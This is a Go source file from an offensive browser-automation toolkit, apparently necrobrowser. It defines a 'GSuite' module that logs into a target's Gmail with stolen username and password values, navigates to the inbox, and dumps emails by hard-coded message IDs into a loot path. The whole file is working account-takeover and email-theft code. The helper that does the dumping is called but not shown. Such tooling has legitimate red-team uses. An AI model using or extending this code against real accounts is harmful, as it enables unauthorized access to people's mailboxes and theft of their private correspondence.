package gsuite

import (
	"context"
	"github.com/muraenateam/necrobrowser/action/navigation"

	"github.com/muraenateam/necrobrowser/action"
	"github.com/muraenateam/necrobrowser/action/login"
	//"github.com/muraenateam/necrobrowser/action/screenshot"
	"github.com/muraenateam/necrobrowser/log"
	"github.com/muraenateam/necrobrowser/zombie"
)

const (
	// Name of this zombie
	Name = "GSuite"
)

type GSuite struct {
	zombie.Target

	MyAccount   string
	GMailUrl    string
	GDriveUrl   string
	GMailSearch string
	MessageIds  []string
}

type Extrusion struct {
	zombie.Extrusion
}

func NewGSuite(target zombie.Target) *GSuite {

	target.Tag = zombie.GetTag(Name)
	return &GSuite{
		Target:      target,
		MyAccount:   "https://myaccount.google.com/personal-info",
		GMailUrl:    "https://mail.google.com/mail/#inbox",
		GDriveUrl:   "https://drive.google.com/drive/my-drive",
		GMailSearch: "https://mail.google.com/mail/u/0/#search/",
		MessageIds:  []string{"WE3gZntbRyu_-ArGKEu-1g@ismtpd0033p1mdw1.sendgrid.net", "N--9o4ddQzaSaaLdZrxFIQ@ismtpd0030p1mdw1.sendgrid.net"},
	}
}

// Name returns the action name
func (z *GSuite) Name() string {
	return Name
}

// SetLootPath updates the zombie target object
func (z *GSuite) SetLootPath(lp string) {
	z.Target.LootPath = lp
}

// SetContext updates the zombie context object
func (z *GSuite) SetContext(c context.Context) {
	z.Target.Context = c
}

// Instrument instructs the chrome context to perform operations on the defined target
func (z *GSuite) Instrument() (interface{}, error) {
	var err error

	a := action.Action{Target: z.Target}
	z.Info("Instrumenting Google accounts")

	loginAutomation := &login.Login{
		Action:   a,
		URL:      "https://mail.google.com/mail",
		Username: z.Target.Username,
		// for headless mode, use this selector
		//UsernameSelector: `#gaia_firstform > div > div > div > div > input`,

		// selector for GUI MODE
		UsernameSelector: `#identifierId`, // - GUI MODE
		Password:         z.Target.Password,
		PasswordSelector: `#password > div > div > div > input`,
	}
	if err = loginAutomation.Do(); err != nil {
		log.Error("Error performing login: %v", err)
		return nil, err
	}

	nav := navigation.Navigation{
		Action: a,
		URL:    "https://mail.google.com/mail/u/0/#inbox",
	}
	if err = nav.Navigate(); err != nil {
		log.Error("Error navigating to Gmail: %v", err)
		return nil, err
	}

	z.Debug("Extracting stuff now...")

	// search for defined keywords
	for _, msgId := range z.MessageIds {

		z.dumpEmailByMessageId(msgId)

	}

	return "", nil
}
